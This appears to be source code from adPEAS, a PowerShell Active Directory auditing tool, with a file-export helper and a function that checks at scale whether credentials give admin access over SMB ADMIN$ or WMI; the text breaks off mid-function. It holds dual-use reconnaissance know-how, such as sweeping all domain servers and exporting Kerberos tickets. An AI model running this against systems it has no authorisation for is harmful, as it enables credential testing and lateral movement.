# ----- Export-adPEASFile.ps1 -----

<#
.SYNOPSIS
    Central helper function for file export operations in adPEAS.

.DESCRIPTION
    Provides consistent file export handling across all adPEAS modules with:
    - Filename sanitization (removes invalid characters)
    - Path validation (checks directory exists)
    - Overwrite handling (warns if file exists, optional force)
    - Consistent error handling and logging

    Supports three export types:
    - Text: Plain text content (UTF-8)
    - Json: PowerShell objects converted to JSON (UTF-8, no BOM)
    - Binary: Raw byte arrays

.PARAMETER Path
    The target file path. Can be:
    - Full path: C:\Reports\output.json
    - Relative path: .\output.json
    - Filename only: output.json (uses current directory)

.PARAMETER Content
    The content to write. Type depends on -Type parameter:
    - Text: String content
    - Json: PowerShell object (will be converted to JSON)
    - Binary: Byte array

.PARAMETER Type
    The export type: Text, Json, or Binary.
    Default: Text

.PARAMETER JsonDepth
    For Json type: Maximum depth for ConvertTo-Json.
    Default: 10

.PARAMETER Force
    Overwrite existing file without warning.
    Default: $false (warns if file exists)

.PARAMETER SanitizeFilename
    Sanitize the filename part of the path (remove invalid characters).
    Default: $true

.PARAMETER CreateDirectory
    Create the target directory if it doesn't exist.
    Default: $false

.EXAMPLE
    Export-adPEASFile -Path "report.txt" -Content $reportText -Type Text
    Exports text content to report.txt in current directory.

.EXAMPLE
    Export-adPEASFile -Path "C:\Reports\templates.json" -Content $templateData -Type Json
    Exports object as JSON with depth 10.

.EXAMPLE
    Export-adPEASFile -Path "ticket.kirbi" -Content $ticketBytes -Type Binary -Force
    Exports binary data, overwriting if exists.

.EXAMPLE
    $result = Export-adPEASFile -Path "CertTemplate_$name.json" -Content $data -Type Json -SanitizeFilename
    Sanitizes filename (removes invalid chars) and exports.

.OUTPUTS
    PSCustomObject with:
    - Success: $true/$false
    - Path: Final resolved path (after sanitization)
    - Message: Success/error message
    - BytesWritten: Number of bytes written (if successful)

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>

function Export-adPEASFile {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$Path,

        [Parameter(Mandatory=$true)]
        [object]$Content,

        [Parameter(Mandatory=$false)]
        [ValidateSet('Text', 'Json', 'Binary')]
        [string]$Type = 'Text',

        [Parameter(Mandatory=$false)]
        [int]$JsonDepth = 10,

        [Parameter(Mandatory=$false)]
        [switch]$Compress,

        [Parameter(Mandatory=$false)]
        [switch]$Force,

        [Parameter(Mandatory=$false)]
        [switch]$SanitizeFilename = $true,

        [Parameter(Mandatory=$false)]
        [switch]$CreateDirectory
    )

    begin {
        # Characters invalid in Windows filenames
        $InvalidChars = [System.IO.Path]::GetInvalidFileNameChars()
    }

    process {
        try {
            # Resolve and validate path
            $resolvedPath = $Path

            # If path contains directory, split it
            $directory = [System.IO.Path]::GetDirectoryName($Path)
            $filename = [System.IO.Path]::GetFileName($Path)

            # Handle empty directory (filename only)
            if ([string]::IsNullOrEmpty($directory)) {
                $directory = Get-Location
            }

            # Sanitize filename if requested
            if ($SanitizeFilename -and -not [string]::IsNullOrEmpty($filename)) {
                $originalFilename = $filename
                foreach ($char in $InvalidChars) {
                    $filename = $filename -replace [regex]::Escape($char), '_'
                }
                # Also replace some problematic characters not in InvalidChars
                $filename = $filename -replace '[\[\]{}()]', '_'
                # Remove consecutive underscores
                $filename = $filename -replace '_+', '_'
                # Trim underscores from start/end
                $filename = $filename.Trim('_')

                if ($filename -ne $originalFilename) {
                    Write-Log "[Export-adPEASFile] Sanitized filename: '$originalFilename' -> '$filename'"
                }
            }

            # Reconstruct full path
            $resolvedPath = Join-Path -Path $directory -ChildPath $filename

            # Convert to absolute path
            if (-not [System.IO.Path]::IsPathRooted($resolvedPath)) {
                $resolvedPath = Join-Path -Path (Get-Location) -ChildPath $resolvedPath
            }

            Write-Log "[Export-adPEASFile] Target path: $resolvedPath"

            # Validate directory
            $targetDir = [System.IO.Path]::GetDirectoryName($resolvedPath)

            if (-not (Test-Path -Path $targetDir -PathType Container)) {
                if ($CreateDirectory) {
                    Write-Log "[Export-adPEASFile] Creating directory: $targetDir"
                    New-Item -Path $targetDir -ItemType Directory -Force | Out-Null
                } else {
                    return [PSCustomObject]@{
                        Success = $false
                        Path = $resolvedPath
                        Message = "Directory does not exist: $targetDir"
                        BytesWritten = 0
                    }
                }
            }

            # Check existing file
            if ((Test-Path -Path $resolvedPath) -and -not $Force) {
                Write-Warning "[Export-adPEASFile] File already exists: $resolvedPath (use -Force to overwrite)"
                return [PSCustomObject]@{
                    Success = $false
                    Path = $resolvedPath
                    Message = "File already exists (use -Force to overwrite)"
                    BytesWritten = 0
                }
            }

            # Write content based on type
            $bytesWritten = 0

            switch ($Type) {
                'Text' {
                    # Text content - use Out-File with specified encoding
                    $Content | Out-File -FilePath $resolvedPath -Encoding UTF8 -Force
                    $bytesWritten = (Get-Item $resolvedPath).Length
                    Write-Log "[Export-adPEASFile] Wrote text file: $bytesWritten bytes"
                }

                'Json' {
                    # JSON content - convert object and write without BOM
                    $jsonContent = if ($Compress) {
                        $Content | ConvertTo-Json -Depth $JsonDepth -Compress
                    } else {
                        $Content | ConvertTo-Json -Depth $JsonDepth
                    }

                    # Use UTF8 without BOM for JSON (better compatibility)
                    $utf8NoBom = New-Object System.Text.UTF8Encoding $false
                    [System.IO.File]::WriteAllText($resolvedPath, $jsonContent, $utf8NoBom)

                    $bytesWritten = (Get-Item $resolvedPath).Length
                    Write-Log "[Export-adPEASFile] Wrote JSON file: $bytesWritten bytes"
                }

                'Binary' {
                    # Binary content - write raw bytes
                    if ($Content -isnot [byte[]]) {
                        return [PSCustomObject]@{
                            Success = $false
                            Path = $resolvedPath
                            Message = "Binary type requires byte array content"
                            BytesWritten = 0
                        }
                    }

                    [System.IO.File]::WriteAllBytes($resolvedPath, $Content)
                    $bytesWritten = $Content.Length
                    Write-Log "[Export-adPEASFile] Wrote binary file: $bytesWritten bytes"
                }
            }

            # Return success
            return [PSCustomObject]@{
                Success = $true
                Path = $resolvedPath
                Message = "Successfully exported to: $resolvedPath"
                BytesWritten = $bytesWritten
            }
        }
        catch {
            Write-Log "[Export-adPEASFile] Error: $($_.Exception.Message)"
            return [PSCustomObject]@{
                Success = $false
                Path = $resolvedPath
                Message = "Export failed: $($_.Exception.Message)"
                BytesWritten = 0
            }
        }
    }
}



# ----- Test-RemoteAdminAccess.ps1 -----

<#
.SYNOPSIS
    Tests if the current user has administrative access on remote Windows systems.

.DESCRIPTION
    Test-RemoteAdminAccess checks administrative access on remote computers using
    SMB (ADMIN$ share) with automatic WMI fallback.

    The function supports:
    - Pipeline input for computer names
    - Parallel execution using Runspaces for performance
    - Configurable timeout and thread pool size
    - Alternate credentials
    - Automatic WMI fallback when SMB fails (configurable)

    Test Methods:
    - SMB (Primary): Tests ADMIN$ share access - most reliable, requires port 445
    - WMI (Fallback): Tests WMI registry access (HKLM) - requires port 135

.PARAMETER ComputerName
    One or more computer names to test. Accepts pipeline input.
    Can be hostname, FQDN, or IP address.

.PARAMETER Credential
    Optional PSCredential for authentication. If not specified, uses current user context.
    Cannot be combined with -Username/-Password.

.PARAMETER Username
    Username for authentication, as an alternative to -Credential.
    Accepts 'user', 'DOMAIN\user' or 'user@domain.com'. A bare username is prefixed with the
    NetBIOS name of the currently connected domain (if an adPEAS session exists), because SMB
    and WMI would otherwise treat it as a local account on the target system.
    Must be used together with -Password.

.PARAMETER Password
    Password for -Username. Accepts a plaintext string or a SecureString.
    An empty string is allowed (accounts with PASSWD_NOTREQD).

.PARAMETER Timeout
    Connection timeout in milliseconds. Default: 2000ms (2 seconds).

.PARAMETER ThrottleLimit
    Maximum number of concurrent connections. Default: 32.
    Adjust based on network capacity and target environment.

.PARAMETER Method
    The method to use for testing admin access. Default: SMB.
    - SMB: Tests ADMIN$ share access (most reliable, port 445)
    - WMI: Tests WMI registry access only (port 135)
    - All: Tries SMB first, then WMI as fallback

.PARAMETER NoFallback
    Disables automatic WMI fallback when SMB fails.
    By default, if SMB fails due to port/connectivity issues, WMI is tried.

.EXAMPLE
    Test-RemoteAdminAccess -ComputerName "SERVER01"
    Tests admin access on a single server using SMB (with WMI fallback).

.EXAMPLE
    "SERVER01", "SERVER02", "SERVER03" | Test-RemoteAdminAccess
    Tests admin access on multiple servers via pipeline.

.EXAMPLE
    Get-DomainComputer -OperatingSystem "*Server*" | Select-Object -ExpandProperty dNSHostName | Test-RemoteAdminAccess -ThrottleLimit 50
    Tests admin access on all domain servers with increased parallelism.

.EXAMPLE
    $cred = Get-Credential
    Get-Content servers.txt | Test-RemoteAdminAccess -Credential $cred -Timeout 5000
    Tests admin access using alternate credentials with extended timeout.

.EXAMPLE
    Test-RemoteAdminAccess -ComputerName "SERVER01" -Username "contoso\administrator" -Password "P@ssw0rd"
    Tests admin access using username and password instead of a PSCredential object.

.EXAMPLE
    Get-DomainComputer -OperatingSystem "*Server*" | Test-RemoteAdminAccess -Username "j.doe" -Password "P@ssw0rd"
    Tests admin access on all domain servers, the bare username is resolved against the connected domain.

.EXAMPLE
    Test-RemoteAdminAccess -ComputerName "SERVER01" -Method WMI
    Tests admin access using WMI only (useful when SMB is blocked).

.EXAMPLE
    Test-RemoteAdminAccess -ComputerName "SERVER01" -NoFallback
    Tests admin access using SMB only, without WMI fallback.

.OUTPUTS
    PSCustomObject with properties:
    - ComputerName: Target computer name
    - IsAdmin: Boolean indicating admin access
    - Method: Test method that succeeded (SMB or WMI)
    - ResponseTime: Time taken for the test in milliseconds
    - Error: Error message if test failed, otherwise $null

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>

function Test-RemoteAdminAccess {
    [CmdletBinding(DefaultParameterSetName='Credential')]
    param(
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true, ParameterSetName='Credential')]
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true, ParameterSetName='UsernamePassword')]
        [Alias('DNSHostName', 'Name', 'CN', 'IPAddress')]
        [string[]]$ComputerName,

        [Parameter(Mandatory=$false, ParameterSetName='Credential')]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$true, ParameterSetName='UsernamePassword')]
        [ValidateNotNullOrEmpty()]
        [string]$Username,

        # Accepts SecureString or String (allows empty passwords for PASSWD_NOTREQD accounts)
        [Parameter(Mandatory=$false, ParameterSetName='UsernamePassword')]
        [AllowNull()]
        [AllowEmptyString()]
        $Password,

        [Parameter(Mandatory=$false)]
        [ValidateRange(500, 30000)]
        [int]$Timeout = 2000,

        [Parameter(Mandatory=$false)]
        [ValidateRange(1, 100)]
        [int]$ThrottleLimit = 32,

        [Parameter(Mandatory=$false)]
        [ValidateSet('SMB', 'WMI', 'All')]
        [string]$Method = 'SMB',

        [Parameter(Mandatory=$false)]
        [switch]$NoFallback
    )

    begin {
        # Build a PSCredential from -Username/-Password so that everything downstream
        # only has to deal with $Credential
        if ($PSCmdlet.ParameterSetName -eq 'UsernamePassword') {
            # Empty string is falsy in PowerShell - check whether the parameter was passed at all
            if (-not $PSBoundParameters.ContainsKey('Password')) {
                throw "Parameter -Username requires -Password. Pass -Password '' for accounts with an empty password."
            }

            # -Password accepts a SecureString or a plaintext string
            if ($Password -is [System.Security.SecureString]) {
                $SecurePassword = $Password
            }
            else {
                # ConvertTo-SecureString rejects empty strings, so build the SecureString manually
                $PlainPassword = if ($null -eq $Password) { '' } else { [string]$Password }
                $SecurePassword = New-Object System.Security.SecureString
                foreach ($PasswordChar in $PlainPassword.ToCharArray()) {
                    $SecurePassword.AppendChar($PasswordChar)
                }
                $SecurePassword.MakeReadOnly()
            }

            # A bare username would be treated as a local account by SMB/WMI - prefix the
            # NetBIOS name of the connected domain, same normalization as Connect-adPEAS
            $CredentialUsername = $Username
            if ($Username -notmatch '\\' -and $Username -notmatch '@') {
                if ($Script:LDAPContext -and $Script:LDAPContext['Domain']) {
                    $NetBIOSDomain = ($Script:LDAPContext['Domain'] -split '\.')[0].ToUpper()
                    $CredentialUsername = "$NetBIOSDomain\$Username"
                    Write-Log "[Test-RemoteAdminAccess] Username normalized for SMB: $Username -> $CredentialUsername"
                }
                else {
                    Write-Log "[Test-RemoteAdminAccess] No active session - using username as-is: $Username (target will treat it as a local account)"
                }
            }

            $Credential = New-Object System.Management.Automation.PSCredential($CredentialUsername, $SecurePassword)
            Write-Log "[Test-RemoteAdminAccess] Using credentials for user: $CredentialUsername"
        }

        Write-Log "[Test-RemoteAdminAccess] Starting remote admin access check (Method=$Method, Fallback=$(-not $NoFallback))"

        # Collect all computer names from pipeline (HashSet for deduplication)
        $allComputers = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)

        # Detect Kerberos/PTT session - Runspaces don't inherit Kerberos ticket context from LSA cache
        # If Kerberos was used AND no explicit credentials provided, we must use sequential execution
        $forceSequential = $false
        $kerberosSession = $Script:LDAPContext -and $Script:LDAPContext['KerberosUsed']

        if ($kerberosSession -and -not $Credential) {
            $forceSequential = $true
            Write-Log "[Test-RemoteAdminAccess] Kerberos/PTT session detected without explicit credentials - switching to sequential execution"
            Write-Warning "Kerberos session detected: Parallel execution disabled (Runspaces don't inherit Kerberos ticket context). Use -Credential for parallel execution."
        }

        # Combined test script block with SMB and WMI support
        $testScriptBlock = {
            param(
                [string]$Computer,
                [int]$TimeoutMs,
                [System.Management.Automation.PSCredential]$Cred,
                [string]$TestMethod,
                [bool]$AllowFallback
            )

            $result = [PSCustomObject]@{
                ComputerName = $Computer
                IsAdmin      = $false
                Method       = $null
                ResponseTime = 0
                Error        = $null
            }

            $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()

            # ===== Helper: Convert Exception to Error Info =====
            # NOTE: This is a local copy of the error handling logic because Runspaces
            # run in isolation and don't have access to adPEAS-ErrorCodes.ps1 functions.
            # See adPEAS-ErrorCodes.ps1 for the central implementation.
            function Get-Win32ErrorInfo {
                param(
                    [Parameter(Mandatory=$true)]
                    [System.Exception]$Exception,
                    [string]$Context = "Operation"
                )

                $errorInfo = @{
                    Message = $null
                    ShouldFallback = $false
                    IsAccessDenied = $false
                }

                $hresult = $Exception.HResult
                $win32Code = if ($hresult) { $hresult -band 0xFFFF } else { 0 }

                # Win32 Error Codes (language-independent):
                # 5    = ERROR_ACCESS_DENIED
                # 1326 = ERROR_LOGON_FAILURE (bad username/password)
                # 1219 = ERROR_SESSION_CREDENTIAL_CONFLICT (multiple connections)
                # 53   = ERROR_BAD_NETPATH (network path not found)
                # 67   = ERROR_BAD_NET_NAME (network name not found)
                # 1311 = ERROR_NO_LOGON_SERVERS (no logon servers available)

                # WMI/RPC HRESULT values:
                # 0x800706BA = RPC server unavailable
                # 0x80070005 = Access denied (HRESULT form)
                # 0x80041003 = WBEM_E_ACCESS_DENIED

                switch ($win32Code) {
                    5 {
                        $errorInfo.Message = "Access denied"
                        $errorInfo.IsAccessDenied = $true
                    }
                    1326 {
                        $errorInfo.Message = "Invalid credentials"
                        $errorInfo.IsAccessDenied = $true
                    }
                    1219 {
                        $errorInfo.Message = "Session credential conflict"
                        $errorInfo.IsAccessDenied = $true
                    }
                    { $_ -in @(53, 67) } {
                        $errorInfo.Message = "Network path not found"
                        $errorInfo.ShouldFallback = $true
                    }
                    1311 {
                        $errorInfo.Message = "No logon servers available"
                        $errorInfo.ShouldFallback = $true
                    }
                    1722 {
                        # RPC server unavailable (Win32 code form)
                        $errorInfo.Message = "RPC server unavailable"
                        $errorInfo.ShouldFallback = $true
                    }
                    default {
                        # Check full HRESULT for WMI-specific errors
                        switch ($hresult) {
                            0x800706BA {
                                $errorInfo.Message = "RPC server unavailable"
                                $errorInfo.ShouldFallback = $true
                            }
                            { $_ -in @(0x80070005, 0x80041003) } {
                                $errorInfo.Message = "Access denied"
                                $errorInfo.IsAccessDenied = $true
                            }
                            default {
                                # Unknown error - include details
                                if ($hresult) {
                                    $errorInfo.Message = "$Context error (0x{0:X8}): {1}" -f $hresult, $Exception.Message
                                } else {
                                    $errorInfo.Message = "$Context error: $($Exception.Message)"
                                }
                            }
                        }
                    }
                }

                return $errorInfo
            }

            # ===== Helper: Safe TCP Port Check =====
            function Test-TcpPort {
                param($TargetHost, $Port, $TimeoutMs)

                $tcpResult = @{
                    Success = $false
                    Error = $null
                }

                $tcpClient = $null
                try {
                    $tcpClient = New-Object System.Net.Sockets.TcpClient
                    $connectTask = $tcpClient.BeginConnect($TargetHost, $Port, $null, $null)
                    $connected = $connectTask.AsyncWaitHandle.WaitOne($TimeoutMs, $false)

                    if (-not $connected) {
                        $tcpResult.Error = "Connection timeout (port $Port)"
                        return $tcpResult
                    }

                    try {
                        $tcpClient.EndConnect($connectTask)
                        $tcpResult.Success = $true
                    } catch {
                        $tcpResult.Error = "Port $Port refused"
                    }
                } catch {
                    if ($_.Exception.Message -match "No such host is known") {
                        $tcpResult.Error = "DNS resolution failed"
                    } else {
                        $tcpResult.Error = "Connection error: $($_.Exception.Message)"
                    }
                } finally {
                    if ($tcpClient) {
                        try { $tcpClient.Close() } catch { }
                        try { $tcpClient.Dispose() } catch { }
                    }
                }

                return $tcpResult
            }

            # ===== SMB Test Function =====
            function Test-SMBAdmin {
                param($TargetComputer, $TimeoutMs, $Cred)

                $smbResult = @{
                    Success = $false
                    Error = $null
                    ShouldFallback = $false
                }

                try {
                    # Validate computer name (prevent injection)
                    if ($TargetComputer -match '[<>:"|?*\\\/]' -or $TargetComputer -match '^\s*$') {
                        $smbResult.Error = "Invalid computer name"
                        return $smbResult
                    }

                    # Quick TCP connectivity check on port 445
                    $tcpCheck = Test-TcpPort -TargetHost $TargetComputer -Port 445 -TimeoutMs $TimeoutMs
                    if (-not $tcpCheck.Success) {
                        $smbResult.Error = $tcpCheck.Error
                        $smbResult.ShouldFallback = $true
                        return $smbResult
                    }

                    # Test ADMIN$ share access
                    $adminShare = "\\$TargetComputer\ADMIN$"

                    if ($Cred) {
                        $driveName = "adPEAS_$([guid]::NewGuid().ToString('N').Substring(0,8))"
                        $psDrive = $null

                        try {
                            # Create temporary PSDrive with credentials
                            $psDrive = New-PSDrive -Name $driveName -PSProvider FileSystem -Root $adminShare -Credential $Cred -ErrorAction Stop
                            $smbResult.Success = $true
                        } catch {
                            $errInfo = Get-Win32ErrorInfo -Exception $_.Exception -Context "SMB"
                            $smbResult.Error = $errInfo.Message
                            $smbResult.ShouldFallback = $errInfo.ShouldFallback

                            # Special handling for credential conflict - try existing session
                            $win32Code = if ($_.Exception.HResult) { $_.Exception.HResult -band 0xFFFF } else { 0 }
                            if ($win32Code -eq 1219) {
                                $testPathResult = Test-Path -Path $adminShare -ErrorAction SilentlyContinue
                                if ($testPathResult) {
                                    $smbResult.Success = $true
                                    $smbResult.Error = $null
                                }
                            }
                        } finally {
                            # Always remove PSDrive
                            if ($psDrive) {
                                try { Remove-PSDrive -Name $driveName -Force -ErrorAction SilentlyContinue } catch { }
                            }
                        }
                    } else {
                        # No credentials - use current context with proper error handling
                        try {
                            $null = Get-Item -Path $adminShare -ErrorAction Stop
                            $smbResult.Success = $true
                        } catch {
                            $errInfo = Get-Win32ErrorInfo -Exception $_.Exception -Context "SMB"
                            $smbResult.Error = $errInfo.Message
                            $smbResult.ShouldFallback = $errInfo.ShouldFallback
                        }
                    }
                } catch {
                    # Outer catch for unexpected errors
                    $errInfo = Get-Win32ErrorInfo -Exception $_.Exception -Context "SMB"
                    $smbResult.Error = $errInfo.Message
                    $smbResult.ShouldFallback = $true
                }

                return $smbResult
            }

            # ===== WMI Test Function =====
            function Test-WMIAdmin {
                param($TargetComputer, $TimeoutMs, $Cred)

                $wmiResult = @{
                    Success = $false
                    Error = $null
                }

                $wmiScope = $null
                $searcher = $null
                $wmiResultSet = $null

                try {
                    # Validate computer name
                    if ($TargetComputer -match '[<>:"|?*]' -or $TargetComputer -match '^\s*$') {
                        $wmiResult.Error = "Invalid computer name"
                        return $wmiResult
                    }

                    # Quick TCP connectivity check on port 135 (RPC)
                    $tcpCheck = Test-TcpPort -TargetHost $TargetComputer -Port 135 -TimeoutMs $TimeoutMs
                    if (-not $tcpCheck.Success) {
                        $wmiResult.Error = $tcpCheck.Error
                        return $wmiResult
                    }

                    # Build WMI connection options
                    $wmiOptions = New-Object System.Management.ConnectionOptions
                    $wmiOptions.Timeout = [TimeSpan]::FromMilliseconds($TimeoutMs)

                    if ($Cred) {
                        $wmiOptions.Username = $Cred.UserName
                        $wmiOptions.Password = $Cred.GetNetworkCredential().Password
                        # Handle both DOMAIN\user and user@domain formats
                        $netCred = $Cred.GetNetworkCredential()
                        if (-not [string]::IsNullOrEmpty($netCred.Domain)) {
                            $wmiOptions.Authority = "ntlmdomain:$($netCred.Domain)"
                        }
                    }

                    # Connect to WMI StdRegProv (Registry Provider) - requires admin for HKLM\SYSTEM
                    $wmiScope = New-Object System.Management.ManagementScope("\\$TargetComputer\root\default", $wmiOptions)

                    try {
                        $wmiScope.Connect()

                        if ($wmiScope.IsConnected) {
                            # Use StdRegProv to check if we can read HKLM\SYSTEM\CurrentControlSet
                            # This requires admin privileges
                            $regPath = New-Object System.Management.ManagementPath("StdRegProv")
                            $regClass = New-Object System.Management.ManagementClass($wmiScope, $regPath, $null)

                            # Try to enumerate subkeys of HKLM\SYSTEM\CurrentControlSet\Control
                            # HKEY_LOCAL_MACHINE = 2147483650
                            $inParams = $regClass.GetMethodParameters("EnumKey")
                            $inParams["hDefKey"] = [uint32]2147483650
                            $inParams["sSubKeyName"] = "SYSTEM\CurrentControlSet\Control"

                            $outParams = $regClass.InvokeMethod("EnumKey", $inParams, $null)

                            # Return value 0 = success, 5 = access denied
                            if ($outParams["ReturnValue"] -eq 0) {
                                $wmiResult.Success = $true
                            } elseif ($outParams["ReturnValue"] -eq 5) {
                                $wmiResult.Error = "Access denied (WMI)"
                            } else {
                                $wmiResult.Error = "WMI registry access failed (code: $($outParams["ReturnValue"]))"
                            }

                            $regClass.Dispose()
                        } else {
                            $wmiResult.Error = "WMI connection failed"
                        }
                    } catch [System.UnauthorizedAccessException] {
                        $wmiResult.Error = "Access denied (WMI)"
                    } catch [System.Runtime.InteropServices.COMException] {
                        $errInfo = Get-Win32ErrorInfo -Exception $_.Exception -Context "WMI"
                        $wmiResult.Error = $errInfo.Message
                    }
                } catch {
                    $errInfo = Get-Win32ErrorInfo -Exception $_.Exception -Context "WMI"
                    $wmiResult.Error = $errInfo.Message
                } finally {
                    # Dispose WMI objects
                    if ($wmiResultSet) {
                        try { $wmiResultSet.Dispose() } catch { }
                    }
                    if ($searcher) {
                        try { $searcher.Dispose() } catch { }
                    }
                    if ($wmiScope) {
                        # ManagementScope doesn't implement IDisposable directly
                        # but we should clear references
                        $wmiScope = $null
                    }
                }

                return $wmiResult
            }

            # ===== Main Test Logic =====
            try {
                # Test based on method selection
                if ($TestMethod -eq 'SMB' -or $TestMethod -eq 'All') {
                    $smbResult = Test-SMBAdmin -TargetComputer $Computer -TimeoutMs $TimeoutMs -Cred $Cred

                    if ($smbResult.Success) {
                        $result.IsAdmin = $true
                        $result.Method = 'SMB'
                    } elseif ($TestMethod -eq 'SMB' -and -not $AllowFallback) {
                        # SMB only, no fallback
                        $result.Error = $smbResult.Error
                        $result.Method = 'SMB'
                    } elseif ($smbResult.ShouldFallback -and $AllowFallback) {
                        # SMB failed with connectivity issue, try WMI fallback
                        $wmiResult = Test-WMIAdmin -TargetComputer $Computer -TimeoutMs $TimeoutMs -Cred $Cred

                        if ($wmiResult.Success) {
                            $result.IsAdmin = $true
                            $result.Method = 'WMI'
                        } else {
                            $result.Error = "SMB: $($smbResult.Error); WMI: $($wmiResult.Error)"
                            $result.Method = 'SMB+WMI'
                        }
                    } elseif ($TestMethod -eq 'All' -and -not $smbResult.Success) {
                        # For 'All' method, always try WMI if SMB failed
                        $wmiResult = Test-WMIAdmin -TargetComputer $Computer -TimeoutMs $TimeoutMs -Cred $Cred

                        if ($wmiResult.Success) {
                            $result.IsAdmin = $true
                            $result.Method = 'WMI'
                        } else {
                            $result.Error = "SMB: $($smbResult.Error); WMI: $($wmiResult.Error)"
                            $result.Method = 'SMB+WMI'
                        }
                    } else {
                        # SMB failed with access denied (not connectivity), no fallback needed
                        $result.Error = $smbResult.Error
                        $result.Method = 'SMB'
                    }
                }

                if ($TestMethod -eq 'WMI') {
                    $wmiResult = Test-WMIAdmin -TargetComputer $Computer -TimeoutMs $TimeoutMs -Cred $Cred

                    if ($wmiResult.Success) {
                        $result.IsAdmin = $true
                        $result.Method = 'WMI'
                    } else {
                        $result.Error = $wmiResult.Error
                        $result.Method = 'WMI'
                    }
                }

            } catch {
                $result.Error = $_.Exception.Message
                if (-not $result.Method) {
                    $result.Method = $TestMethod
                }
            }

            $stopwatch.Stop()
            $result.ResponseTime = $stopwatch.ElapsedMilliseconds

            return $result
        }
    }

    process {
        # Collect computer names from pipeline (HashSet handles deduplication)
        foreach ($computer in $ComputerName) {
            if (-not [string]::IsNullOrWhiteSpace($computer)) {
                $trimmedName = $computer.Trim()

                # Validate computer name using central validation function
                if (-not (Test-ValidComputerName -ComputerName $trimmedName -AllowFQDN -AllowIPAddress)) {
                    Write-Log "[Test-RemoteAdminAccess] Security: Rejected invalid/malicious computer name: '$trimmedName'"
                    # Return error result for this computer
                    [PSCustomObject]@{
                        ComputerName = $trimmedName
                        IsAdmin      = $false
                        Method       = $null
                        ResponseTime = 0
                        Error        = "Invalid computer name - rejected for security"
                    }
                    continue
                }

                [void]$allComputers.Add($trimmedName)
            }
        }
    }

    end {
        if ($allComputers.Count -eq 0) {
            Write-Log "[Test-RemoteAdminAccess] No computers to test"
            return
        }

        # Determine fallback behavior
        $allowFallback = (-not $NoFallback) -and ($Method -eq 'SMB')

        # Results collection
        $results = [System.Collections.ArrayList]::new()
        $adminCount = 0

        # ===== Sequential Execution (for Kerberos/PTT sessions) =====
        if ($forceSequential) {
            Write-Log "[Test-RemoteAdminAccess] Testing $($allComputers.Count) unique computer(s) SEQUENTIALLY (Kerberos session)"

            $completedCount = 0
            foreach ($computer in $allComputers) {
                $completedCount++

                # Progress indicator
                if ($allComputers.Count -gt 10) {
                    Write-Progress -Activity "Testing Remote Admin Access (Sequential)" `
                                   -Status "Testing $computer ($completedCount of $($allComputers.Count))" `
                                   -PercentComplete (($completedCount / $allComputers.Count) * 100)
                }

                # Execute test script block directly in main process (preserves Kerberos ticket context)
                $testResult = & $testScriptBlock -Computer $computer `
                                                 -TimeoutMs $Timeout `
                                                 -Cred $Credential `
                                                 -TestMethod $Method `
                                                 -AllowFallback $allowFallback

                if ($testResult) {
                    [void]$results.Add($testResult)
                    if ($testResult.IsAdmin) {
                        $adminCount++
                    }
                }

                # Progress logging for large scans
                if ($allComputers.Count -gt 100 -and $completedCount % 50 -eq 0) {
                    Write-Log "[Test-RemoteAdminAccess] Progress: $completedCount/$($allComputers.Count) completed"
                }
            }

            # Clear progress bar
            if ($allComputers.Count -gt 10) {
                Write-Progress -Activity "Testing Remote Admin Access (Sequential)" -Completed
            }
        }
        # ===== Parallel Execution (default - using RunspacePool) =====
        else {
            Write-Log "[Test-RemoteAdminAccess] Testing $($allComputers.Count) unique computer(s) with ThrottleLimit=$ThrottleLimit"

            # Create RunspacePool
            $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
            $runspacePool = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspacePool(1, $ThrottleLimit, $sessionState, $Host)
            $runspacePool.ApartmentState = [System.Threading.ApartmentState]::MTA
            $runspacePool.Open()

            # Create runspaces for each computer
            $runspaces = [System.Collections.ArrayList]::new()

            try {
                foreach ($computer in $allComputers) {
                    $ps = [PowerShell]::Create()
                    $ps.RunspacePool = $runspacePool

                    [void]$ps.AddScript($testScriptBlock)
                    [void]$ps.AddParameter('Computer', $computer)
                    [void]$ps.AddParameter('TimeoutMs', $Timeout)
                    [void]$ps.AddParameter('TestMethod', $Method)
                    [void]$ps.AddParameter('AllowFallback', $allowFallback)
                    if ($Credential) {
                        [void]$ps.AddParameter('Cred', $Credential)
                    }

                    $runspaceInfo = [PSCustomObject]@{
                        PowerShell = $ps
                        Handle     = $ps.BeginInvoke()
                        Computer   = $computer
                    }

                    [void]$runspaces.Add($runspaceInfo)
                }

                # Collect results
                $completedCount = 0

                foreach ($rs in $runspaces) {
                    try {
                        # Wait for completion with overall timeout (TimeoutMs * 2 to allow for retries)
                        $completed = $rs.Handle.AsyncWaitHandle.WaitOne($Timeout * 3)

                        if ($completed) {
                            $output = $rs.PowerShell.EndInvoke($rs.Handle)
                            if ($output) {
                                foreach ($item in $output) {
                                    [void]$results.Add($item)
                                    if ($item.IsAdmin) {
                                        $adminCount++
                                    }
                                }
                            }
                        } else {
                            # Timeout - create error result
                            $errorResult = [PSCustomObject]@{
                                ComputerName = $rs.Computer
                                IsAdmin      = $false
                                Method       = $Method
                                ResponseTime = $Timeout * 3
                                Error        = "Operation timeout"
                            }
                            [void]$results.Add($errorResult)
                        }
                    } catch {
                        # Create error result for failed runspace
                        $errorResult = [PSCustomObject]@{
                            ComputerName = $rs.Computer
                            IsAdmin      = $false
                            Method       = $Method
                            ResponseTime = 0
                            Error        = $_.Exception.Message
                        }
                        [void]$results.Add($errorResult)
                    } finally {
                        # Always dispose PowerShell instance
                        if ($rs.PowerShell) {
                            try {
                                $rs.PowerShell.Stop()
                                $rs.PowerShell.Dispose()
                            } catch { }
                        }
                    }
                    $completedCount++

                    # Progress indicator for large scans
                    if ($allComputers.Count -gt 100 -and $completedCount % 50 -eq 0) {
                        Write-Log "[Test-RemoteAdminAccess] Progress: $completedCount/$($allComputers.Count) completed"
                    }
                }
            } finally {
                # Cleanup RunspacePool (even on Ctrl+C)
                if ($runspacePool) {
                    try {
